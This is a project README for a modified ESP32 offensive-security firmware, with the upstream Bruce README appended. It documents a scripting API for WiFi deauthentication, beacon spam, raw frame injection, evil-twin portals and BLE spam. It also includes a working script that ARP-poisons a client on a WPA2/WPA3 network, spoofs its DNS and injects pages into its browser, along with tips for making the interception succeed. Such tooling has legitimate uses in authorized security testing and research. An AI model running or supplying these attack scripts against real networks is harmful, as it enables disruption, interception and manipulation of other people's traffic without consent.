![Bruce-Modded on the LilyGo T-Embed CC1101](./media/pictures/bruce_banner.jpg)

# Bruce-Modded — Dev 1.1

**Stock Bruce, with the WiFi radio handed to JavaScript.**

Scriptable deauth & beacon-spam · raw 802.11 frame injection · promiscuous
packet capture · captive-portal (evil-twin) engine · headless BLE spam · **ARP
spoofing, DNS spoofing and HTTP interception that work on WPA2** · split scripts
and background jobs — all driven from the on-device JavaScript interpreter.

Built and tested on the **LilyGo T-Embed CC1101** (ESP32-S3, 16 MB flash /
8 MB PSRAM).

![firmware](https://img.shields.io/badge/firmware-Dev%201.1-blue)
![board](https://img.shields.io/badge/board-LilyGo%20T--Embed%20CC1101-informational)
![mcu](https://img.shields.io/badge/MCU-ESP32--S3-success)
![license](https://img.shields.io/badge/license-AGPL--3.0-orange)

[Flash it](#flashing-the-release-image) ·
[What's new](#whats-new-in-dev-11) ·
[JavaScript API](#javascript-api) ·
[Build it](#building-from-source) ·
[Limitations](#known-limitations)

---

## What is this?

Bruce-Modded is a fork of [Bruce](https://github.com/pr3y/Bruce) — the ESP32
offensive-security firmware — with a scriptable WiFi/BLE attack engine added to
its JavaScript interpreter.

Stock Bruce exposes its WiFi attacks as **menus you tap**. This mod exposes them
as **functions a script calls**, adds a raw 802.11 transmit path, a promiscuous
capture engine and a captive-portal engine, and then makes the interpreter safe
against the JS engine's moving garbage collector.

> **Status:** Dev 1.1, based on upstream `main` @ `a59213f3` (2026-09-24).
> Only the LilyGo T-Embed CC1101 target is built and tested.

---

## What's new in Dev 1.1

### Protected networks, at last

Dev 1.0 could only forge frames onto open networks — a WPA2 client drops a data
frame it cannot verify with its pairwise key. Dev 1.1 sends its frames on the
**associated station interface** instead, so the hardware encrypts them with the
association key on the way out. That is the same path Bruce's own NetCut menu
already used, and it is what makes the interception below work on WPA2/WPA3.

| # | Change | Detail |
|---|--------|--------|
| 11 | **ARP spoofing** | `arpSpoof.*` — two-way poison pairs re-sent every 250 ms by a service task, plus ARP-scan target discovery |
| 12 | **DNS spoofing** | `dnsSpoof.*` — a rule table matched against intercepted UDP/53 A-record queries and answered from the board with the client's own transaction id and ports |
| 13 | **HTTP interception** | `httpInterceptor.*` — captures plain-HTTP requests (ports 80/8080) and answers them with a forged 302 or an injected page; `getInterceptedData()` returns the request ring |
| 14 | **Script folders and background scripts** | `scriptFolder.*` — create/list/load/run/close, split a script into parts that share globals, run jobs in their own context and FreeRTOS task (`stop`/`kill`), plus a string shared store |
| 15 | **Boot version** | The splash screen now reads **Bruce / dev 1.1** |

Verified on the device against a real client on a real WPA2/WPA3 network: the
board joined the network as a station, poisoned the target, answered its DNS
lookups from the board and replaced its plain-HTTP pages — the target's browser
rendered the forged page.

> The interception is **not** transparent. The ESP32 cannot forward or NAT, so a
> poisoned target loses its real internet path while the attack runs, and only
traffic that ends at this board can be intercepted. Read
> [known limitations](#known-limitations) first.

---

## What's new in Dev 1.0

### Firmware engine

| # | Change | Detail |
|---|--------|--------|
| 1 | **Headless WiFi attacks** | `wifi_atks` gained a deadline-bounded API (`wifi_atk_setWifi()`, `wifi_atk_unsetWifi()`, `wifi_complete_cleanup()`, `headlessBeaconSpam()`) so a script can run an attack with no button presses and no UI blocking |
| 2 | **Raw 802.11 injection** | `wifi_raw_inject()` transmits arbitrary frames with `esp_wifi_80211_tx()`, the AP callback bypassed, auto-selecting the STA/AP interface, with repeat, inter-frame gap and CRC32 FCS options |
| 3 | **Promiscuous capture** | PSRAM-backed capture engine: 2 session slots, 100 packets / 50 KB per session, self-reaping deadlines |
| 4 | **Captive portal / evil twin** | `wifi_portal_run()` brings up an open AP, hijacks DNS, answers captive-portal probe paths with a 302 and can deauth the real AP |
| 5 | **Application-layer builders** | Real IPv4 + UDP/TCP checksums (`wifi_build_dns_response()`, `wifi_inject_udp()`, `wifi_inject_tcp()`) and frame parsers (`wifi_parse_frame()`, `wifi_parse_ipv4()`) |
| 6 | **Headless BLE spam** | `ble_spam` exposes the same advertisement builders as the on-screen menu, deadline-bounded |
| 7 | **Interpreter GC safety** | The JS engine (`mquickjs`) has a *compacting, moving* collector that never scans the C stack, so every binding that builds an array or object now pins its intermediates in `JSGCRef` and re-reads them after each allocating call — 15 interpreter modules hardened |
| 8 | **Script lifecycle** | `interpreter.cpp` calls `wifi_js_cleanup()` on exit, so a script cannot leak radio state into the next one |
| 9 | **Boot version** | The splash screen now reads **Bruce / Dev 1.0** |
| 10 | **Release build** | `build.py` also emits `Bruce-modded.bin`, one merged image for a single `write_flash` |

### New script bindings

17 new WiFi bindings, 2 BLE bindings and 5 misc helpers, on top of everything
stock Bruce already exposed. Signatures: [JavaScript API](#javascript-api).

---

## Flashing the release image

**Download:** `Bruce-modded.bin` + `Bruce-modded.bin.sha256` are committed at the
repository root (4,362,480 bytes, sha256 `a68e5e9f…cc2f4`). The previous image is
still attached to the
[**Dev 1.0 release**](https://github.com/Axagt40/Bruce-Modded/releases/tag/dev-1.0).

The image is **merged** (bootloader + partition table + app) and **must be
flashed at offset `0x0`**.

```sh
sha256sum -c Bruce-modded.bin.sha256
esptool.py --chip esp32s3 --port /dev/ttyACM0 --baud 921600 \
    write_flash 0x0 Bruce-modded.bin
```

* Replace `/dev/ttyACM0` with your port (`COM5` on Windows).
* The board exposes USB-Serial-JTAG while it is in console mode (`lsusb` →
  `303a:1001`). If no port appears, it is in **Mass Storage** mode
  (`303a:0002`) — exit that feature on the device and re-plug. No host command
  can switch it for you.
* Clean install (wipes saved config and LittleFS):
  `esptool.py ... erase_flash` first, then flash.
* Flashing at any offset other than `0x0` leaves bootloader and partition table
  mismatched and the board will not boot.
* To go back to stock Bruce or a Launcher install, flash that project's merged
  image at `0x0` the same way, after an `erase_flash`.

First boot shows **Bruce** with **dev 1.1** underneath.

---

## JavaScript API

The engine is `mquickjs`, so scripts are **plain ES5**: no `let`/`const`, no
arrow functions, no template literals, no destructuring, no classes, no promises.

```js
var wifi = require("wifi");

// 1. Attack from a script - no menus involved
wifi.deauth("AA:BB:CC:DD:EE:FF", 6, 10);     // bssid, channel, seconds
wifi.beaconSpam(4, 30, "FreeWiFi");          // 4 = counter SSID, 30 seconds

// 2. Listen promiscuously, then read the frames back
var id = wifi.captureStart(6, 15000);        // channel, timeoutMs -> session id
var pkts = wifi.getCapturedPackets(id, 100); // [{timestamp, channel, rssi, data}, ...]
var info = wifi.packetInfo(pkts[0].data);    // decode one frame

// 3. Transmit a hand-built frame
wifi.injectPacket("80000000ffffffffffffaabbccddeeffaabbccddeeff0000", 6);
```

| Binding | Returns |
|---------|---------|
| `wifi.deauth(bssid, channel?, seconds?)` | `number` |
| `wifi.deauthAll(seconds?, channel?)` | `number` |
| `wifi.beaconSpam(mode?, seconds?, ssid?)` | `number` (mode 4 = counter SSID) |
| `wifi.sniffHandshake(bssid, channel?, seconds?, ssid?)` | `object` (writes a pcap) |
| `wifi.injectPacket(hex, channel?)` | `boolean` |
| `wifi.sendRaw80211(hex, channel?, options?)` | `object` |
| `wifi.captureStart(channel?, timeoutMs?)` / `wifi.captureStop(id)` | `number` / `boolean` |
| `wifi.getCapturedPackets(id, maxPackets?)` | `array` |
| `wifi.setPromiscuous(enable, channel?)` | `boolean` |
| `wifi.portal(ssid, channel?, options?)` | `object` |
| `wifi.packetInfo(hex)` | `object` |
| `wifi.injectDns(...)` `wifi.injectHttp(...)` `wifi.injectHttpRedirect(...)` `wifi.injectHtml(...)` | `object` |
| `arpSpoof.start(targetIP, gatewayIP?)` / `stop()` / `getStatus()` / `getTargets(rescan?)` | `object` |
| `dnsSpoof.start(domain, ip)` / `startAll(pattern, ip)` / `stop()` / `getStatus()` / `clearRules()` | `object` |
| `httpInterceptor.start()` / `stop()` / `addRedirect(pattern, url)` / `addInjection(pattern, html)` / `clearRules()` / `getInterceptedData(clear?)` | `object` |
| `scriptFolder.create/list/load/run/close/isRunning/getAllScripts/stop/kill` + `setShared/getShared/clearShared` | `object` |
| `ble.spam(type?, seconds?)` / `ble.spamModes()` | `number` / `array` |
| `ir.transmitRaw(frequency, rawData)` | `boolean` |
| `subghz.scan(startFreq?, stopFreq?, maxLoops?)` | `string` |
| `serial.available()` / `serial.read(maxBytes?, timeoutMs?)` | `number` / `string` |
| `storage.exists(path)` / `storage.size(path)` / `storage.copy(src, dest, overwrite?)` | `boolean` / `number` / `boolean` |

`test.js` in the repository root is a smoke test for the raw-injection and
capture bindings: it prints one `PASS`/`FAIL` line per binding to the serial
console, and its header doubles as a worked example.

### Intercepting a client on a WPA2/WPA3 network

```js
wifi.connect("MyNetwork", 20, "password");
arpSpoof.start("192.168.1.50");                 // two-way poison, re-sent every 250 ms
dnsSpoof.startAll("*", wifi.getIPAddress());    // answer every lookup with this board
httpInterceptor.addInjection("*", "<h1>Intercepted</h1>");
httpInterceptor.start();
delay(60000);                                   // the browse window
httpInterceptor.stop(); dnsSpoof.stop(); arpSpoof.stop();
```

The client has to reach *this* board for there to be anything to answer: the
poisoned DNS answer is what points it here, and something must be listening on
the port it uses — start Bruce's own web UI from the serial console with `webui`
while the script runs. Plain HTTP only: a browser that upgrades an `http://`
address to HTTPS fails (there is no TLS listener), and a client with Private DNS
(DoT) on never reaches the spoofer at all.

### Running a script

Put the script on the SD card under `/scripts`, `/BruceScripts` or `/BruceJS`
(LittleFS works as a fallback), then open **Scripts** in the main menu, or load
it from another script:

```js
load('/BruceJS/myscript.js')
```

---

## Known limitations

These are properties of the radio, the board or the engine - not bugs waiting to
be fixed. Read them before filing an issue.

* **Application-layer injection only lands on OPEN / WEP networks.** On
  WPA2/WPA3 the client's radio requires the frame to be encrypted with its
  pairwise key, so a forged plaintext data frame is dropped at the radio.
  Dev 1.1's `arpSpoof`/`dnsSpoof`/`httpInterceptor` are the exception: they
  transmit on the associated station interface, so they work on WPA2/WPA3.
* **The interception cannot forward.** A poisoned target loses its real path to
  the internet while the attack runs - its traffic arrives at the board and is
  answered (or dropped) there. There is no NAT and no relaying.
* **Only traffic that ends at the board can be intercepted.** There is no TCP
  handshake handling and no routing, so a request to any other address is
  dropped unanswered and the client never sends anything to intercept. Poison
  the pair, answer DNS with the board's own address, and keep a listener on the
  port the client uses (Bruce's web UI on port 80 is enough).
* **Plain HTTP only** (ports 80/8080) and **DNS A records over UDP/53 only**. A
  client using Private DNS (DoT/DoH) bypasses the DNS spoofer completely, and a
  browser that upgrades `http://` to HTTPS shows nothing — test with an
  IP-literal `http://` URL to see the injection.
* **The interception lives inside a single script run**: the engine is torn down
  and the ARP tables restored when the script ends.
* **An injected page must fit one ethernet frame** (roughly 1300 bytes of body);
  longer content is trimmed so `Content-Length` stays truthful.
* **Forged TCP/DNS must match the live conversation** (ports, TCP seq/ack, DNS
  transaction id) or the victim's stack discards it silently. Capture →
  `wifi.packetInfo()` → inject with the captured values.
* **The evil twin has no uplink** (the ESP32 cannot NAT), so every DNS name
  resolves back to the device and portal pages must be self-contained.
* **The twin AP is open**, so devices holding a saved WPA2 profile for the same
  SSID usually will not auto-join it.
* **`storage.copy` is unreliable for file-to-file copies** - it treats the
  destination as a directory. Use `storage.read()` + `storage.write()`.
* **No FreeFont is loaded**, so the panel font is ASCII only - emoji render as
  boxes.
* **The panel is 320x170 landscape**, so lay out from `display.width()` /
  `display.height()` rather than hardcoded geometry.
* **Long native calls block the script** - the UI freezes until they return.

---

## Building from source

Requires PlatformIO Core 6.1.19+ and python3. The first build needs network
access to resolve `lib_deps` (Arduino-ESP32 3.3.9, pioarduino platform 55.03.39,
toolchain-xtensa-esp-elf 14.2.0); everything is cached under `.pio/` afterwards.

```sh
pio run -e lilygo-t-embed-cc1101
```

This produces `Bruce-lilygo-t-embed-cc1101.bin` and a merged copy named
`Bruce-modded.bin` in the project root (a `build.py` post-action runs
`esptool merge-bin`). Because `BRUCE_VERSION` is a `build_flags` define,
changing it invalidates the whole build cache - expect a ~15-25 minute rebuild.

---

## About the upstream project

Everything below this line is the upstream Bruce project - feature list,
supported devices, credits and license. Bruce-Modded is a derivative work and
keeps all of it intact.

---

# :shark: Bruce

Bruce is a versatile ESP32 firmware packed with offensive-security tools, built to make Red Team operations fast and portable.

It also supports [M5Stack](https://shop.m5stack.com), [LILYGO](https://lilygo.cc) , [RockBase IoT](https://www.rockbaseiot.com) and [Elecrow](https://www.elecrow.com) products, and works great with the Cardputer, Sticks, M5Cores, T-Decks and T-Embeds.

## :zap: Get Our Official DevKit!

### RF REAPER

**RF REAPER** is our custom PCB devkit, purpose-built for Bruce!

Every major feature works natively, right out of the box. Sub-GHz, NFC/RFID, IR, 2.4GHz(NRF), GPS-ready, and a microSD, all driven by a beefy ESP32-S3 (16MB Flash / 8MB PSRAM). Tons of GPIOs via the AW9523 expander plus Flipper Zero & iButton header compatibility mean you can hack, mod, and build on it endlessly. Want a specific function? Ask us with an issue, we'll check it.

👉 **[Buy the RF REAPER and official boards](https://shop.bruce.computer)**

**Check our fully open-source hardware too:** https://bruce.computer/boards

More custom devkit boards coming soon! Stay across our communities!

## :building_construction: How to install

### The easiest way to install Bruce is using our official Web Flasher!

### Check out: https://bruce.computer/flasher

Alternatively, you can download the latest binary from releases or actions and flash locally using esptool.py

```sh
esptool.py --port /dev/ttyACM0 write_flash 0x00000 Bruce-<device>.bin
```

**For m5stack devices**

If you already use M5Launcher to manage your m5stack device, you can install it with OTA

Or you can burn it directly from the [m5burner tool](https://docs.m5stack.com/en/download), just search for 'Bruce' (My official builds will be uploaded by "owner" and have photos.) on the device category you want to and click on burn

## :keyboard: Discord Server

Contact us in our [Discord Server](https://discord.gg/WJ9XF9czVT)!

## :bookmark_tabs: Wiki

For more information on each function supported by Bruce, [read our wiki here](https://wiki.bruce.computer/).
Also, [read our FAQ](https://wiki.bruce.computer/faq/)

## :computer: List of Features

<details>
  <summary><h2>WiFi</h2></summary>

- [x] Connect to WiFi
- [x] WiFi AP
- [x] Disconnect WiFi
- [x] [WiFi Atks](https://wiki.bruce.computer/features/wifi/#wifi-atks)
  - [x] [Beacon Spam](https://wiki.bruce.computer/features/wifi/#beacon-spam)
  - [x] [Target Atk](https://wiki.bruce.computer/features/wifi/#target-atks)
    - [x] Information
    - [x] Target Deauth
    - [x] EvilPortal + Deauth
  - [x] Deauth Flood (More than one target)
- [x] [Wardriving](https://wiki.bruce.computer/features/gps/#wardriving)
- [x] [TelNet](https://wiki.bruce.computer/features/wifi/#telnet)
- [x] [SSH](https://wiki.bruce.computer/features/wifi/#ssh)
- [x] [RAW Sniffer](https://wiki.bruce.computer/features/wifi/#raw-sniffer)
- [x] [TCP Client](https://wiki.bruce.computer/features/wifi/#client-tcp)
- [x] [TCP Listener](https://wiki.bruce.computer/features/wifi/#listen-tcp)
- [x] [Evil Portal](https://wiki.bruce.computer/features/wifi/#evil-portal)
- [x] [Scan Hosts](https://wiki.bruce.computer/features/wifi/#scan-hosts) (with TCP Port scanning)
- [x] [Responder](https://wiki.bruce.computer/features/wifi/#responder)
- [x] [Arp Spoofing](https://wiki.bruce.computer/features/wifi/#arp-spoofing)
- [x] [Arp Poisoning](https://wiki.bruce.computer/features/wifi/#arp-poisoning)
- [x] [Wireguard Tunneling](https://wiki.bruce.computer/features/wifi/#wireguard-tunneling)
- [x] Brucegotchi
  - [x] Pwnagotchi friend
  - [x] Pwngrid spam faces & names
    - [x] [Optional] DoScreen a very long name and face
    - [x] [Optional] Flood uniq peer identifiers

</details>

<details>
  <summary><h2>BLE</h2></summary>

- [x] [BLE Scan](https://wiki.bruce.computer/features/ble/#ble-scan)
- [x] Bad BLE - Run Ducky scripts, similar to [BadUsb](https://wiki.bruce.computer/features/ble/#badble)
- [x] BLE Keyboard - Cardputer and T-Deck Only
- [x] iOS Spam
- [x] Windows Spam
- [x] Samsung Spam
- [x] Android Spam
- [x] Spam All
</details>

<details>
  <summary><h2>RF</h2></summary>

- [x] Scan/Copy
- [x] [Custom SubGhz](https://wiki.bruce.computer/features/rf/#replay-payloads-like-flipper)
- [x] Spectrum
- [x] Jammer Full (sends a full squared wave into output)
- [x] Jammer Intermittent (sends PWM signal into output)
- [x] Config
  - [x] RF TX Pin
  - [x] RF RX Pin
  - [x] RF Module
    - [x] RF433 T/R M5Stack
    - [x] [CC1101 (Sub-Ghz)](https://wiki.bruce.computer/features/rf/#cc1101)
  - [x] RF Frequency
- [x] Replay
</details>

<details>
  <summary><h2>RFID</h2></summary>

- [x] Read tag
- [x] Read 125kHz
- [x] Clone tag
- [x] Write NDEF records
- [x] Amiibolink
- [x] Chameleon
- [x] Write data
- [x] Erase data
- [x] Save file
- [x] Load file
- [x] Config
  - [x] [RFID Module](https://wiki.bruce.computer/features/rfid/#supported-modules)
    - [x] PN532
    - [x] PN532Killer
- [ ] Emulate tag
</details>

<details>
  <summary><h2>IR</h2></summary>

- [x] TV-B-Gone
- [x] IR Receiver
- [x] [Custom IR (NEC, NECext, SIRC, SIRC15, SIRC20, Samsung32, RC5, RC5X, RC6)](https://wiki.bruce.computer/features/ir/#replay-payloads-like-flipper)
- [x] Config - [X] Ir TX Pin - [X] Ir RX Pin
</details>

<details>
  <summary><h2>FM</h2></summary>

- [x] [Broadcast standard](https://wiki.bruce.computer/features/fm/#broadcast-standard)
- [x] [Broadcast reserved](https://wiki.bruce.computer/features/fm/#broadcast-standard)
- [x] [Broadcast stop](https://wiki.bruce.computer/features/fm/#broadcast-stop)
- [ ] [FM Spectrum](https://wiki.bruce.computer/features/fm/#fm-spectrum)
- [ ] [Hijack Traffic Announcements](https://wiki.bruce.computer/features/fm/#hijack-ta)
- [ ] [Config](https://wiki.bruce.computer/features/fm/#bookmark_tabs-config)
</details>

<details>
  <summary><h2>NRF24</h2></summary>

- [x] [NRF24 Jammer](https://wiki.bruce.computer/features/nrf24/)
- [x] 2.4G Spectrum
- [ ] Mousejack
</details>

<details>
  <summary><h2>Scripts</h2></summary>

- [x] [JavaScript Interpreter](https://wiki.bruce.computer/features/js-interpreter/) [Credits to justinknight93](https://github.com/justinknight93/Doolittle)
</details>

<details>
  <summary><h2>Others</h2></summary>

- [x] Mic Spectrum
- [x] [QRCodes](https://wiki.bruce.computer/features/others/#qrcodes)
  - [x] Custom
  - [x] PIX (Brazil bank transfer system)
- [x] [SD Card Mngr](https://github.com/pr3y/Bruce/wiki/Others#sd-card-mngr)
  - [x] View image (jpg)
  - [x] File Info
  - [x] [Wigle Upload](https://wiki.bruce.computer/features/gps/#how-to-use-wigle)
  - [x] Play Audio
  - [x] View File
- [x] LittleFS Mngr
- [x] [WebUI](https://wiki.bruce.computer/controlling-device/webui/)
  - [x] Server Structure
  - [x] Html
  - [x] SDCard Mngr
  - [x] Spiffs Mngr
- [x] Megalodon
- [x] [BADUsb (New features, LittleFS and SDCard)](https://wiki.bruce.computer/features/others/#badusb)
- [x] USB Keyboard - Cardputer and T-Deck Only
- [x] [iButton](https://wiki.bruce.computer/features/others/#ibutton)
- [x] LED Control
</details>

<details>
  <summary><h2>Clock</h2></summary>

- [x] RTC Support
- [x] NTP time adjust
- [x] Manual adjust
</details>

<details>
  <summary><h2>Connect (ESPNOW)</h2></summary>

- [x] Send File
- [x] Receive File
- [x] Send Commands
- [x] Receive Commands
</details>

<details>
  <summary><h2>Config</h2></summary>

- [x] Brightness
- [x] Dim Time
- [x] Orientation
- [x] UI Color
- [x] Boot Sound on/off
- [x] Clock
- [x] Sleep
- [x] Restart
</details>

## Specific functions per Device, the ones not mentioned here are available to all.

| Device                                                                                                                                                                                      | CC1101 | NRF24 | FM Radio |        PN532         | Mic  | BadUSB | RGB Led | Speaker | Fuel Gauge | LITE_VERSION |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----: | :---: | :------: | :------------------: | :--: | :----: | :-----: | :-----: | :--------: | :----------: |
| [M5Stack Cardputer](https://shop.m5stack.com/products/m5stack-cardputer-kit-w-m5stamps) (and ADV)                                                                                           |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: |  :ok:  |  :ok:   | NS4168  |    :x:     |     :x:      |
| [M5Stack M5StickC PLUS2](https://shop.m5stack.com/products/m5stickc-plus2-esp32-mini-iot-development-kit)                                                                                   |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: | :ok:¹  |   :x:   |  Tone   |    :x:     |     :x:      |
| [M5Stack M5StickC PLUS](https://shop.m5stack.com/products/m5stickc-plus-esp32-pico-mini-iot-development-kit)                                                                                |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: | :ok:¹  |   :x:   |  Tone   |    :x:     |     :x:²     |
| [M5Stack M5Core BASIC](https://shop.m5stack.com/products/basic-core-iot-development-kit)                                                                                                    |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: | :ok:¹  |   :x:   |  Tone   |    :x:     |     :x:      |
| [M5Stack M5Core2](https://shop.m5stack.com/products/m5stack-core2-esp32-iot-development-kit-v1-1)                                                                                           |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: | :ok:¹  |   :x:   |   :x:   |    :x:     |     :x:      |
| [M5Stack M5CoreS3](https://shop.m5stack.com/products/m5stack-cores3-esp32s3-lotdevelopment-kit)/[SE](https://shop.m5stack.com/products/m5stack-cores3-se-iot-controller-w-o-battery-bottom) |  :ok:  | :ok:  |   :ok:   |         :ok:         | :x:  |  :ok:  |   :x:   |   :x:   |    :x:     |     :x:      |
| [JCZN CYD&#x2011;2432S028](https://www.aliexpress.us/item/3256804774970998.html)                                                                                                            |  :ok:  | :ok:  |   :ok:   |         :ok:         | :x:  | :ok:¹  |   :x:   |   :x:   |    :x:     |     :x:²     |
| [Lilygo T&#x2011;Embed CC1101](https://lilygo.cc/products/t-embed-cc1101)                                                                                                                   |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: |  :ok:  |  :ok:   |  :ok:   |    :ok:    |     :x:      |
| [Lilygo T&#x2011;Embed](https://lilygo.cc/products/t-embed)                                                                                                                                 |  :ok:  | :ok:  |   :ok:   |         :ok:         | :ok: |  :ok:  |  :ok:   |  :ok:   |    :x:     |     :x:      |
| [Lilygo T-Display-S3](https://lilygo.cc/products/t-display-s3)                                                                                                                              |  :ok:  | :ok:  |   :x:    |         :x:          | :x:  |  :ok:  |   :x:   |   :x:   |    :x:     |     :x:      |
| [Lilygo T&#x2011;Deck](https://lilygo.cc/products/t-deck) ([and pro](https://lilygo.cc/products/t-deck-plus-1))                                                                             |  :ok:  |  :x:  |   :x:    |         :x:          | :x:  |  :ok:  |   :x:   |   :x:   |    :x:     |     :x:      |
| [Lilygo T-Watch-S3](https://lilygo.cc/products/t-watch-s3)                                                                                                                                  |  :x:   |  :x:  |   :x:    |         :x:          | :x:  |  :ok:  |   :x:   |   :x:   |    :x:     |     :x:      |
| [Lilygo T-LoRa Pager](https://lilygo.cc/products/t-lora-pager)                                                                                                                              |  :x:   |  :x:  |   :x:    |         :x:          | :x:  |  :ok:  |   :x:   |   :x:   |    :x:     |     :x:      |
| [Smoochiee V2](https://www.pcbway.com/project/shareproject/Bruce_PCB_Smoochiee_d6a0284b.html)                                                                                               |  :ok:  | :ok:  |   :x:    |         :ok:         | :x:  |  :ok:  |   :x:   |   :x:   |    :x:     |     :x:      |
| [ESP32-C5](https://docs.espressif.com/projects/esp-dev-kits/en/latest/esp32c5/esp32-c5-devkitc-1/user_guide.html)                                                                           |  :ok:  | :ok:  |   :x:    |         :ok:         | :x:  |  :x:   |   :x:   |   :x:   |    :x:     |     :x:      |
| [Bruce RF Reaper](https://www.elecrow.com/bruce-pcb-rf-reaper.html)                                                                                                                         |  :ok:  | :ok:  |   :x:    | :ok: but w/ ST25R3916 | :x:  |  :ok:  |  :ok:   |   :x:   |    :ok:    |     :x:      |
| [Elecrow 24B](https://www.elecrow.com/2-4inch-esp32-miner-lcd-display-2pcs-cryptocurrency-solo-miner-with-1000kh-s-hashrate.html)                                                            |  :ok:  | :ok:  |   :ok:   |         :ok:         | :x:  | :ok:¹  |   :x:   |   :x:   |    :x:     |     :x:²     |
| [Elecrow 3.5"](https://www.elecrow.com/esp-terminal-with-esp32-3-5-inch-parallel-480x320-tft-capacitive-touch-display-rgb-by-chip-ili9488.html)                                                                                                                                                        |  :ok:  | :ok:  |   :ok:   |         :ok:         | :x:  | :ok:¹  |   :x:   |   :x:   |    :x:     |     :x:²     |
| [NM-CYD-C5 + RF HAT](https://https://rockbase.shop/products/nm-cyd-c5-colorful)                                                                                                                         |  :ok:  | :ok:  |   :x:    | :ok: | :x:  |  :ok:  |  :ok:   |   :x:   |    :ok:    |     :x:      |
² CYD have a LITE_VERSION version for Launcher Compatibility
¹ Core, CYD and StickCs Bad-USB: [here](https://wiki.bruce.computer/features/others/#badusb)

_LITE_VERSION_: TelNet, SSH, WireGuard, ScanHosts, RawSniffer, Brucegotchi, BLEBacon, BLEScan and Interpreter are NOT available for M5Launcher Compatibility

## :sparkles: Why and how does it look?

Bruce stems from a keen observation within the community focused on devices like Flipper Zero. While these devices offered a glimpse into the world of offensive security, there was a palpable sense that something more could be achieved without being that overpriced, particularly with the robust and modular hardware ecosystem provided by ESP32 Devices, Lilygo and M5Stack products.

![Bruce Main Menu](./media/pictures/pic1.png)
![Bruce on M5Core](./media/pictures/core.png)
![Bruce on Stick](./media/pictures/stick.png)
![Bruce on CYD](./media/pictures/cyd.png)
![Bruce on CYD with NM-RF-HAT](./media/pictures/bruce-cyd.png)

Other media can be [found here](./media/).

## :clap: Acknowledgements

- [@bmorcelli](https://github.com/bmorcelli) for new core and a bunch of new features, also porting to many devices!
- [@IncursioHack](https://github.com/IncursioHack) for adding RF and RFID modules features.
- [@Luidiblu](https://github.com/Luidiblu) for logo and UI design assistance.
- [@eadmaster](https://github.com/eadmaster) for adding a lot of features.
- [@rennancockles](https://github.com/rennancockles) for a lot of RFID code, refactoring and others features.
- [@7h30th3r0n3](https://github.com/7h30th3r0n3) refactoring and a lot of help with WiFi attacks.
- [@Tawank](https://github.com/Tawank) refactoring interpreter among many other things
- @pablonymous RF functions to read RAW Data
- [Smoochiee](https://github.com/smoochiee) for Bruce PCB design.
- TH3_KR4K3N for Stick cplus extender PCB design.
- Everyone who contributed in some way to the project, thanks :heart:

Bruce also stands on the shoulders of other great open-source firmware projects,
which inspired features and code across the project:

- [ESP32Marauder](https://github.com/justcallmekoko/ESP32Marauder) by [@justcallmekoko](https://github.com/justcallmekoko) — WiFi/Bluetooth offensive toolkit.
- [Launcher](https://github.com/bmorcelli/Launcher) by [@bmorcelli](https://github.com/bmorcelli) — the multi-app launcher/bootloader for the devices.
- [Evil-M5Project](https://github.com/7h30th3r0n3/Evil-M5Project) by [@7h30th3r0n3](https://github.com/7h30th3r0n3) — WiFi attack suite for M5Stack.
- [M5Stick-Nemo](https://github.com/n0xa/m5stick-nemo) by [@n0xa](https://github.com/n0xa) — multi-tool firmware for M5Stick devices.

Bruce builds on many free-software libraries, and parts of the RF and NFC/RFID
modules are derived from other projects. See [THIRD_PARTY.md](./THIRD_PARTY.md)
for third-party attribution and copyleft-compliance details.

## :construction: Disclaimer

Bruce is a tool for cyber offensive and red team operations, distributed under the terms of the Affero General Public License (AGPL). It is intended for legal and authorized security testing purposes only. Use of this software for any malicious or unauthorized activities is strictly prohibited. By downloading, installing, or using Bruce, you agree to comply with all applicable laws and regulations. This software is provided free of charge, and we do not accept payments for copies or modifications. The developers of Bruce assume no liability for any misuse of the software. Use at your own risk.
